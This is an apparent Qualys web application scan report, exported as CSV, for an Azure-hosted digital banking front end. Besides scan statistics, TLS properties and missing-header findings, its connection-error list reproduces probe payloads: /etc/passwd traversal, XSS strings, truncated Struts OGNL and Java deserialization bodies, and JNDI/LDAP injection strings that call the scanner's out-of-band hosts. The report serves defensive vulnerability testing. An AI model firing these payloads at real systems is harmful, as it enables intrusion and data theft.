"Web Application Report","22 Feb 2024 11:26AM GMT+0530"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261555","150021","Loaded 0 exclude list entries.
Loaded 0 allow list entries.
HTML form authentication unavailable, no WEBAPP entry found
Target web application page https://fint-int-digitalbankingui-nra.azurewebsites.net/ fetched. Status code:403, Content-Type:text/html, load time:1 milliseconds.
Batch #0 VirtualHostDiscovery: estimated time &lt; 10 minutes (70 tests, 0 inputs)
VirtualHostDiscovery: 70 vulnsigs tests, completed 0  requests, 20 seconds. Completed 0 requests of 70 estimated requests (0%). Module did not finish.
Batch #0 CMSDetection: estimated time &lt; 1 minute (1 tests, 1 inputs)
[CMSDetection phase] : No potential CMS found using Blind Elephant algorithm. Aborting the CMS Detection phase
CMSDetection: 1 vulnsigs tests, completed 40  requests, 162 seconds. Completed 40 requests of 56 estimated requests (71.4286%). All tests completed.
Collected 2 links overall in 0 hours 5 minutes duration.
Batch #0 BannersVersionReporting: estimated time &lt; 1 minute (1 tests, 1 inputs)
BannersVersionReporting: 1 vulnsigs tests, completed 0  requests, 0 seconds. Completed 0 requests of 1 estimated requests (0%). All tests completed.
Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 1) + files:(0 x 1) +  directories:(9 x 1) +  paths:(0 x 2) = total (9) 
Batch #0 WS Directory Path manipulation: estimated time &lt; 1 minute (9 tests, 2 inputs)
WS Directory Path manipulation: 9 vulnsigs tests, completed 9  requests, 10 seconds. Completed 9 requests of 9 estimated requests (100%). All tests completed.
Batch #0 WS enumeration: estimated time &lt; 1 minute (11 tests, 2 inputs)
WS enumeration: 11 vulnsigs tests, completed 12  requests, 20 seconds. Completed 12 requests of 22 estimated requests (54.5455%). All tests completed.
Batch #1 URI parameter manipulation (no auth): estimated time &lt; 1 minute (113 tests, 0 inputs)
Batch #1 URI parameter manipulation (no auth): 113 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
Batch #1 URI blind SQL manipulation (no auth): estimated time &lt; 1 minute (8 tests, 0 inputs)
Batch #1 URI blind SQL manipulation (no auth): 8 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
Batch #1 URI parameter time-based tests (no auth): estimated time &lt; 1 minute (16 tests, 0 inputs)
Batch #1 URI parameter time-based tests (no auth): 16 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
Batch #1 URI parameter time-based tests for Apache Struts Vulnerabilities (no auth): estimated time &lt; 1 minute (1 tests, 0 inputs)
Batch #1 URI parameter time-based tests for Apache Struts Vulnerabilities (no auth): 1 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
Batch #4 WebCgiOob: estimated time &lt; 1 minute (133 tests, 1 inputs)
Batch #4 WebCgiOob: 133 vulnsigs tests, completed 196  requests, 323 seconds. Completed 196 requests of 310 estimated requests (63.2258%). All tests completed.
No XML requests found. Skipping XXE tests.
Batch #4 DOM XSS exploitation: estimated time &lt; 1 minute (4 tests, 0 inputs)
Batch #4 DOM XSS exploitation: 4 vulnsigs tests, completed 0  requests, 1 seconds. No tests to execute.
Batch #4 HTTP call manipulation: estimated time &lt; 1 minute (38 tests, 0 inputs)
Batch #4 HTTP call manipulation: 38 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
Batch #4 Open Redirect analysis: estimated time &lt; 1 minute (2 tests, 0 inputs)
Batch #4 Open Redirect analysis: 2 vulnsigs tests, completed 0  requests, 1 seconds. No tests to execute.
CSRF tests will not be launched because the scan is not successfully authenticated.
Batch #4 File Inclusion analysis: estimated time &lt; 1 minute (1 tests, 2 inputs)
Batch #4 File Inclusion analysis: 1 vulnsigs tests, completed 0  requests, 0 seconds. Completed 0 requests of 2 estimated requests (0%). All tests completed.
Batch #4 Cookie manipulation: estimated time &lt; 1 minute (47 tests, 0 inputs)
Batch #4 Cookie manipulation: 47 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
Batch #4 Header manipulation: estimated time &lt; 1 minute (47 tests, 2 inputs)
Batch #4 Header manipulation: 47 vulnsigs tests, completed 126  requests, 212 seconds. Completed 126 requests of 260 estimated requests (48.4615%). XSS optimization removed 58 links. All tests completed.
Batch #4 shell shock detector: estimated time &lt; 1 minute (1 tests, 2 inputs)
Batch #4 shell shock detector: 1 vulnsigs tests, completed 2  requests, 0 seconds. Completed 2 requests of 2 estimated requests (100%). All tests completed.
Batch #4 shell shock detector(form): estimated time &lt; 1 minute (1 tests, 0 inputs)
Batch #4 shell shock detector(form): 1 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
Cookies Without Consent no tests enabled.
Batch #5 HTTP Time Bandit: estimated time &lt; 1 minute (1 tests, 10 inputs)
Batch #5 HTTP Time Bandit: 1 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 1) + files:(0 x 1) +  directories:(4 x 1) +  paths:(11 x 2) = total (26) 
Batch #5 Path XSS manipulation: estimated time &lt; 1 minute (15 tests, 2 inputs)
Batch #5 Path XSS manipulation: 15 vulnsigs tests, completed 25  requests, 40 seconds. Completed 25 requests of 26 estimated requests (96.1538%). All tests completed.
Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 1) + files:(0 x 1) +  directories:(1 x 1) +  paths:(0 x 2) = total (1) 
Batch #5 Tomcat Vuln manipulation: estimated time &lt; 1 minute (1 tests, 2 inputs)
Batch #5 Tomcat Vuln manipulation: 1 vulnsigs tests, completed 1  requests, 10 seconds. Completed 1 requests of 1 estimated requests (100%). All tests completed.
Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 1) + files:(0 x 1) +  directories:(16 x 1) +  paths:(0 x 2) = total (16) 
Batch #5 Time based path manipulation: estimated time &lt; 1 minute (16 tests, 2 inputs)
Batch #5 Time based path manipulation: 16 vulnsigs tests, completed 32  requests, 360 seconds. Completed 32 requests of 16 estimated requests (200%). All tests completed.
Path manipulation: Estimated requests (payloads x links): files with extension:(4 x 1) + files:(18 x 1) +  directories:(143 x 1) +  paths:(18 x 2) = total (201) 
Batch #5 Path manipulation: estimated time &lt; 1 minute (183 tests, 2 inputs)
Batch #5 Path manipulation: 183 vulnsigs tests, completed 187  requests, 252 seconds. Completed 187 requests of 201 estimated requests (93.0348%). All tests completed.
WebCgiHrsTests: no test enabled
Batch #5 WebCgiGeneric: estimated time &lt; 1 minute (451 tests, 1 inputs)
Batch #5 WebCgiGeneric: 451 vulnsigs tests, completed 284  requests, 463 seconds. Completed 284 requests of 1210 estimated requests (23.4711%). All tests completed.
Batch #5 Open Redirect analysis: estimated time &lt; 1 minute (2 tests, 0 inputs)
Batch #5 Open Redirect analysis: 2 vulnsigs tests, completed 0  requests, 6 seconds. No tests to execute.
Duration of Crawl Time: 307.00 (seconds)
Duration of Test Phase: 1847.00 (seconds)
Total Scan Time: 2154.00 (seconds)

Total requests made: 941
Average server response time: 0.08 seconds

Average browser load time: 0.09 seconds
","16 Feb 2024 12:08AM GMT+0530","2d4b46bd-e93d-46e2-9571-d4ae7273bcd2","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261580","38717","","16 Feb 2024 12:08AM GMT+0530","9cde1015-155b-451e-a750-b013d8641830","","tcp","20.192.170.11","20.192.170.11","443","Certificate #0 CN=*.azurewebsites.net,O=Microsoft_Corporation,L=Redmond,ST=WA,C=US OCSP status: good
","Certificate Fingerprint:00CF19054BB3EFFC62AAABC1196C42753EBDB19191BBBF8AD950CFA62D01AE78
"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261551","150208","
Referrer-Policy: Header missing
Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
Connection: close
Content-Length: 2342
Content-Type: text/html
Date: Thu, 15 Feb 2024 18:39:29 GMT

Header missing on the following link(s):
(Only first 50 such pages are listed)

GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
","16 Feb 2024 12:08AM GMT+0530","8ff58246-9f6f-4e46-b140-481b7f3c1be7","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261553","150020","Links not permitted:
(This list includes links from QIDs: 150010,150041,150143,150170)

External links discovered:
https://portal.azure.com/
https://go.microsoft.com/fwlink/?linkid=2095007

IP based excluded links:
","16 Feb 2024 12:08AM GMT+0530","740f379e-156d-442b-aade-b7630fffd1cf","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261586","38706","","16 Feb 2024 12:08AM GMT+0530","4ac0140d-65f9-4c1a-a8c7-134a79cec570","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""2""
NAME STATUS
TLSv1.2 _
Extended_Master_Secret yes
Encrypt_Then_MAC no
Heartbeat no
Truncated_HMAC no
Cipher_priority_controlled_by server
OCSP_stapling yes
SCT_extension no
TLSv1.3 _
Heartbeat no
Cipher_priority_controlled_by server
OCSP_stapling yes
SCT_extension no
","PROPS
PROP(1)
	Name:Extended Master Secret Value:yes Protocol:TLSv1.2
PROP(2)
	Name:Encrypt Then MAC Value:no Protocol:TLSv1.2
PROP(3)
	Name:Heartbeat Value:no Protocol:TLSv1.2
PROP(4)
	Name:Truncated HMAC Value:no Protocol:TLSv1.2
PROP(5)
	Name:Cipher priority controlled by Value:server Protocol:TLSv1.2
PROP(6)
	Name:OCSP stapling Value:yes Protocol:TLSv1.2
PROP(7)
	Name:SCT extension Value:no Protocol:TLSv1.2
PROP(8)
	Name:Heartbeat Value:no Protocol:TLSv1.3
PROP(9)
	Name:Cipher priority controlled by Value:server Protocol:TLSv1.3
PROP(10)
	Name:OCSP stapling Value:yes Protocol:TLSv1.3
PROP(11)
	Name:SCT extension Value:no Protocol:TLSv1.3
"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261574","150206","
Content-Security-Policy: Header missing
Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
Connection: close
Content-Length: 2342
Content-Type: text/html
Date: Thu, 15 Feb 2024 18:39:29 GMT

Header missing on the following link(s):
(Only first 50 such pages are listed)

GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
","16 Feb 2024 12:08AM GMT+0530","b1db6bf5-a001-4ccc-a96e-98619976cf44","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3263335","150018","
Total number of unique links that encountered connection errors: 188
Links with highest number of connection errors:
  59 https://fint-int-digitalbankingui-nra.azurewebsites.net/
  37 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico
   3 https://fint-int-digitalbankingui-nra.azurewebsites.net/geoserver/web/
   3 https://fint-int-digitalbankingui-nra.azurewebsites.net/catalog/control/main
   3 https://fint-int-digitalbankingui-nra.azurewebsites.net/rest/api/latest/repos?limit=1000
   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/struts/utils.js
   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/portal/info.jsp
   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/functionRouter
   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/dataname
   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/CFIDE/componentutils/cfcexplorer.cfc
   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/CFIDE/administrator/index.cfm
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- &lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=""com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data""&gt; &lt;dataHandler&gt; &lt;dataSource class=""com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource""&gt; &lt;is class=""javax.crypto.CipherInputStream""&gt; &lt;cipher class=""javax.crypto.NullCipher""&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=""javax.imageio.spi.FilterIter
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/../../../../../../../../../../etc/passwd
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/reports/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/phpinfo.php
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/install/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/core/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/cache/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- &lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=""com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data""&gt; &lt;dataHandler&gt; &lt;dataSource class=""com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource""&gt; &lt;is class=""javax.crypto.CipherInputStream""&gt; &lt;cipher class=""javax.crypto.NullCipher""&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=""javax.imageio.spi.FilterIter
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.bak
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=""name""

(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().subs
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=""name""

(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().subs
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/indexer/v1/sampler -FORMDATA- {""type"":""kafka"",""spec"":{""type"":""kafka"",""ioConfig"":{""type"":""kafka"",""consumerProperties"":{""bootstrap.servers"":""127.0.0.1:6666"",""sasl.mechanism"":""SCRAM-SHA-256"",""security.protocol"":""SASL_SSL"",""sasl.jaas.config"":""com.sun.security.auth.module.JndiLoginModule required user.provider.url=\""rmi://045dcf9119c2f94d9007f228f1e20fe805e45989.729973036092606.2710728069.webcgioob15068503.webcgioob.oob.default.qualys.com/Qualys
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/images/joomla_black.png
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/test/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net//%27%20onmouseover%3D%27alert%289%29%3B%27
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/.svn/entries
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/api.php?wsdl
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/index.action -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=""id""

%{
(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map2.setBean(#request.get('map').get('context')) == t
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/indexer/v1/sampler -FORMDATA- {""type"":""kafka"",""spec"":{""type"":""kafka"",""ioConfig"":{""type"":""kafka"",""consumerProperties"":{""bootstrap.servers"":""127.0.0.1:6666"",""sasl.mechanism"":""SCRAM-SHA-256"",""security.protocol"":""SASL_SSL"",""sasl.jaas.config"":""com.sun.security.auth.module.JndiLoginModule required user.provider.url=\""rmi://f003c9a18b17e9836b3383172ad4edfcc7733c5a.729973036092606.2634475757.webcgioob15068503.webcgioob.oob.default.qualys.com/Qualys
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.orig
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/tools/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/cmdjsp.jsp
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/core/misc/drupal.js
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/sendRequest.jsp
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/php-backdoor.php
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/indexer/v1/sampler?for=connect -FORMDATA- {""type"":""kafka"",""spec"":{""type"":""kafka"",""ioConfig"":{""type"":""kafka"",""consumerProperties"":{""bootstrap.servers"":""127.0.0.1:6666"",""sasl.mechanism"":""SCRAM-SHA-256"",""security.protocol"":""SASL_SSL"",""sasl.jaas.config"":""com.sun.security.auth.module.JndiLoginModule required user.provider.url=\""ldap://a1fd7e857975a2bea7a103af8f0d926aba47bf07.729973036092606.4122646659.webcgioob15068502.webcgioob.oob.default.qual
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/images/banners/shop-ad.jpg
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/imports/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico/%27%20onmouseover%3D%27alert%289%29%3B%27
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/roles/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/admin.aspx
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.inc
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/misc/drupal.js
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.tar.gz
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/pub/errors/enterprise/images/logo.gif
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico%3cscript%3e_q_q=%27%29%28%27%3c/script%3e
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/api.asmx?wsdl
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/manager/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=""id""

%{
(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map2.setBean(#request.get('map').get('context')) == true).toStrin
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net//%22%3e%3cimg%20src%3dq%20onerror%3dalert(9)%3e
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ChangeLog
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/%E5%98%8D%E5%98%8A%0AQualysWASInjection:%20Vulnerable
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ws/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico/z--%3E%3Cqss%3E
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/indexer/v1/sampler?for=connect -FORMDATA- {""type"":""kafka"",""spec"":{""type"":""kafka"",""ioConfig"":{""type"":""kafka"",""consumerProperties"":{""bootstrap.servers"":""127.0.0.1:6666"",""sasl.mechanism"":""SCRAM-SHA-256"",""security.protocol"":""SASL_SSL"",""sasl.jaas.config"":""com.sun.security.auth.module.JndiLoginModule required user.provider.url=\""ldap://5f7374569fb5deb41d91ff9000e2254bb0927c47.729973036092606.2875042361.webcgioob15068502.webcgioob.oob.default.qual
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/users/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/$%7bjndi:ldap:%2f%2f5b5039a7335af84c33be8365a017346911935060.729973036092606.3189663716.webcgioob15044042.webcgioob.oob.default.qualys.com%2fQualysWAS%7d
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net//%22%20qss%3D%22QssAttrValue
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/qsd-php-backdoor.php?c=id
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/zend.jsp
